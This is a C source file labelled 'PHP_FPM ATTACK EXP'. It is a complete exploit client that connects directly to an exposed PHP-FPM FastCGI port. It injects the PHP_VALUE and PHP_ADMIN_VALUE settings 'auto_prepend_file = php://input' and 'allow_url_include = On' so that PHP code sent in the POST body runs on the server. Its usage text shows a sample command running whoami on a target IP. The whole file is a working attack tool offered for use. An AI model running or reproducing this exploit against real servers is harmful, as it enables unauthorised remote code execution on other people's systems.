/*
 * author: Gqleung
 * Email: admin@plasf.cn
 * description: PHP_FPM ATTACK EXP
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include "fastcgi.h"
typedef struct sockaddr SA;
#define PARAMS_BUFF_LEN 1024
#define CONTENT_BUFF_LEN 1024

int requestId;
int sockfd,count,result;

static FCGI_Header MakeHeader(int type,int requestId,int contentLength,int paddingLength){
    FCGI_Header header;
    header.version = FCGI_VERSION_1;
    header.type             = (unsigned char) type;
    header.requestIdB1      = (unsigned char) ((requestId     >> 8) & 0xff);
    header.requestIdB0      = (unsigned char) ((requestId         ) & 0xff);
    header.contentLengthB1  = (unsigned char) ((contentLength >> 8) & 0xff);
    header.contentLengthB0  = (unsigned char) ((contentLength     ) & 0xff);
    header.paddingLength    = (unsigned char) paddingLength;
    header.reserved         =  0;
    return header;
}

static FCGI_BeginRequestBody MakeBeginRequestBody(int role,int keepConnection)
{
    FCGI_BeginRequestBody body;
    body.roleB1 = (unsigned char) ((role >>  8) & 0xff);
    body.roleB0 = (unsigned char) (role         & 0xff);
    body.flags  = (unsigned char) ((keepConnection) ? FCGI_KEEP_CONN : 0);
    memset(body.reserved, 0, sizeof(body.reserved));
    return body;
}

static void BuildParamsBody(
        char *name,
        int nameLen,
        char *value,
        int valueLen,
        unsigned char *bodyBuffPtr,
        int *bodyLenPtr) {
    unsigned char *startBodyBuffPtr = bodyBuffPtr;
    if (nameLen < 0x80) {
        *bodyBuffPtr++ = (unsigned char) nameLen;
    } else {
        *bodyBuffPtr++ = (unsigned char) ((nameLen >> 24) | 0x80);
        *bodyBuffPtr++ = (unsigned char) (nameLen >> 16);
        *bodyBuffPtr++ = (unsigned char) (nameLen >> 8);
        *bodyBuffPtr++ = (unsigned char) nameLen;
    }
    if (valueLen < 0x80) {
        *bodyBuffPtr++ = (unsigned char) valueLen;
    } else {
        *bodyBuffPtr++ = (unsigned char) ((valueLen >> 24) | 0x80);
        *bodyBuffPtr++ = (unsigned char) (valueLen >> 16);
        *bodyBuffPtr++ = (unsigned char) (valueLen >> 8);
        *bodyBuffPtr++ = (unsigned char) valueLen;
    }
    while(*name != '\0'){
        *bodyBuffPtr++ = *name++;
    }
    while(*value != '\0'){
        *bodyBuffPtr++ = *value++;
    }
    *bodyLenPtr = bodyBuffPtr - startBodyBuffPtr;
}
void BuildPostbody(  char *value,
                     int valueLen,
                     unsigned char *bodyBuffPtr,
                     int *bodyLenPtr){
    unsigned char *startBodyBuffPtr = bodyBuffPtr;
    if (valueLen < 0x80) {
        *bodyBuffPtr++ = (unsigned char) valueLen;
    } else {
        *bodyBuffPtr++ = (unsigned char) ((valueLen >> 24) | 0x80);
        *bodyBuffPtr++ = (unsigned char) (valueLen >> 16);
        *bodyBuffPtr++ = (unsigned char) (valueLen >> 8);
        *bodyBuffPtr++ = (unsigned char) valueLen;
    }
    while(*value != '\0'){
        *bodyBuffPtr++ = *value++;
    }
    *bodyLenPtr = bodyBuffPtr - startBodyBuffPtr;
}
void SendParams(char key[],char value[]){
    unsigned char bodyBuff[PARAMS_BUFF_LEN];
    bzero(bodyBuff,PARAMS_BUFF_LEN);
    int keyLen, valueLen, bodyLen;
    keyLen = strlen(key);
    valueLen = strlen(value);
    BuildParamsBody(key,keyLen,value,valueLen,&bodyBuff[0],&bodyLen);
    FCGI_Header nameValueHeader;
    nameValueHeader = MakeHeader(FCGI_PARAMS, requestId,bodyLen, 0);
    int valuenameRecordLen = bodyLen+FCGI_HEADER_LEN;
    char valuenameRecord[valuenameRecordLen];
    memcpy(valuenameRecord, (char *)&nameValueHeader, FCGI_HEADER_LEN);
    memcpy(valuenameRecord+FCGI_HEADER_LEN, bodyBuff, bodyLen);
    count = write(sockfd, (char *)&valuenameRecord, valuenameRecordLen);
    if(count != valuenameRecordLen) {
        printf("write aluenameRecord error.len:%d,send:%d",valuenameRecordLen,count);
        perror("write");
        exit(1);
    }
}
void  SendStartRequestRecord(char ipaddr[],int port){
    struct sockaddr_in serveraddr;
    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("socket");
    }
    bzero((char *)&serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = inet_addr(ipaddr);
    serveraddr.sin_port = htons((unsigned short) port);
    result = connect(sockfd ,(SA *)&serveraddr, sizeof(serveraddr));
    if(result < 0){
        perror("bind");
        exit(1);
    }
    FCGI_BeginRequestRecord beginRecord;
    beginRecord.header = MakeHeader(FCGI_BEGIN_REQUEST, requestId,
                                    sizeof(beginRecord.body), 0);
    beginRecord.body = MakeBeginRequestBody(FCGI_RESPONDER, 0);
    count = write(sockfd, (char *)&beginRecord, sizeof(beginRecord));
    if(count != sizeof(beginRecord)) {
        printf("write error.len: %lu,send:%d",sizeof(beginRecord),count);
        perror("write");
        exit(1);
    }
}
void SendEndRequestRecord(){
    FCGI_Header endHeader;
    endHeader = MakeHeader(FCGI_PARAMS, requestId,
                           0, 0);
    count = write(sockfd, (char *)&endHeader, FCGI_HEADER_LEN);
    if(count != FCGI_HEADER_LEN){
        perror("write");
        exit(1);
    }
}
void ReadRequestRecord(){
    FCGI_Header responderHeader;
    char content[CONTENT_BUFF_LEN];
    int contenLen;
    char tmp[8];
    while(read(sockfd, &responderHeader, FCGI_HEADER_LEN)>0){
        if(responderHeader.type == FCGI_STDOUT){
            contenLen = (responderHeader.contentLengthB1<<8)+(responderHeader.contentLengthB0);
            bzero(content,CONTENT_BUFF_LEN);
            count = read(sockfd,content,contenLen);
            if(count != contenLen){
                perror("read");
            }
            fprintf(stdout,"%s",content);
//跳过填充部分
            if(responderHeader.paddingLength>0){
                count = read(sockfd,tmp,responderHeader.paddingLength);
                if(count != responderHeader.paddingLength){
                    perror("read");
                }
            }
        }else if(responderHeader.type == FCGI_STDERR){
            contenLen = (responderHeader.contentLengthB1<<8)+(responderHeader.contentLengthB0);
            bzero(content,CONTENT_BUFF_LEN);
            count = read(sockfd,content,contenLen);
            if(count != contenLen){
                perror("read");
            }
            fprintf(stdout,"error:%s\n",content);
//跳过填充部分
            if(responderHeader.paddingLength>0){
//long int n=lseek(sockfd,responderHeader.paddingLength,SEEK_CUR);
                count = read(sockfd,tmp,responderHeader.paddingLength);
                if(count != responderHeader.paddingLength){
                    perror("read");
                }
            }
        }else if(responderHeader.type == FCGI_END_REQUEST){
            FCGI_EndRequestBody endRequest;
            count = read(sockfd,&endRequest,8);
            if(count != 8){
                perror("read");
            }
            fprintf(stdout,"\nendRequest:appStatus:%d,protocolStatus:%d\n",(endRequest.appStatusB3<<24)+(endRequest.appStatusB2<<16)
                                                                           +(endRequest.appStatusB1<<8)+(endRequest.appStatusB0),endRequest.protocolStatus);
        }
    }
    close(sockfd);
}
void SendPost(char payload[], int payloadLen){
    FCGI_Header  payloadHeader ;
    int valuenameRecordLen,bodyLen;
    valuenameRecordLen =  payloadLen+FCGI_HEADER_LEN;
    char valuenameRecord[valuenameRecordLen];
    unsigned char bodyBuff[PARAMS_BUFF_LEN];
    payloadHeader = MakeHeader(FCGI_STDIN, requestId,payloadLen, 0);
    BuildPostbody(payload,  payloadLen,&bodyBuff[0],&bodyLen);
    memcpy(valuenameRecord, (char *)&payloadHeader, FCGI_HEADER_LEN);
    memcpy(valuenameRecord+FCGI_HEADER_LEN, bodyBuff, bodyLen);
    write(sockfd, (char *)&valuenameRecord, valuenameRecordLen);
}
void SendKeyValue(char path[],char content_length[]){
    SendParams("GATEWAY_INTERFACE","FastCGI/1.0");
    SendParams("REQUEST_METHOD","POST");
    SendParams("SCRIPT_FILENAME",path);
    SendParams("SCRIPT_NAME",path);
    SendParams("QUERY_STRING","");
    SendParams("REQUEST_URI",path);
    SendParams("DOCUMENT_ROOT","/");
    SendParams("SERVER_SOFTWARE","php/fcgiclient");
    SendParams("REMOTE_ADDR","127.0.0.1");
    SendParams("REMOTE_PORT","9985");
    SendParams("SERVER_ADDR","127.0.0.1");
    SendParams("SERVER_PORT","80");
    SendParams("SERVER_NAME","localhost");
    SendParams("SERVER_PROTOCOL","HTTP/1.1");
    SendParams("CONTENT_TYPE","application/text");
    SendParams("CONTENT_LENGTH",content_length);
    SendParams("PHP_VALUE","auto_prepend_file = php://input");
    SendParams("PHP_ADMIN_VALUE","allow_url_include = On");
}
int main(int argc, char ** argv){
    int i,port;
    char ipaddr[15],*payload,*path;
    if(argc==9) {
        for (i = 0; i < argc; i++) {
            if (strcmp(argv[i], "-t") == 0) {
                strcpy(ipaddr, argv[i + 1]);
            } else if (strcmp(argv[i], "-p") == 0) {
                port = atoi(argv[i + 1]);
            } else if (strcmp(argv[i], "-c") == 0) {
                payload = (char *) malloc(strlen(argv[i + 1]) + 1);
                payload = argv[i + 1];
            } else if (strcmp(argv[i], "-f") == 0) {
                path = (char *) malloc(strlen(argv[i + 1]) + 1);
                path = argv[i + 1];
            }
        }
    }else{
        printf("Wrong number of argc ! Please enter the correct parameters.\n\n-t target\n-p port\n-c php script\n-f file\n\nEg:%s -t 8.8.8.8 -p 9000 -c \"<?php echo \\`whoami\\`;?>\" -f \"/usr/local/lib/php/PEAR.php\"\n\n",argv[0]);
        exit(0);
    }
    requestId = rand()%100+1;
    int payloadLen = strlen(payload)+1;
    char content_length[10];
    sprintf(content_length,"%d",payloadLen);
    //发起连接
    SendStartRequestRecord(ipaddr, port);
    //发送键值对
    SendKeyValue(path,content_length);
    //发送结束Record
    SendEndRequestRecord();
    //发送攻击POST包
    SendPost(payload,payloadLen);
    //发送结束Record
    SendEndRequestRecord();
    //读取返回包
    ReadRequestRecord();
    return 0;
}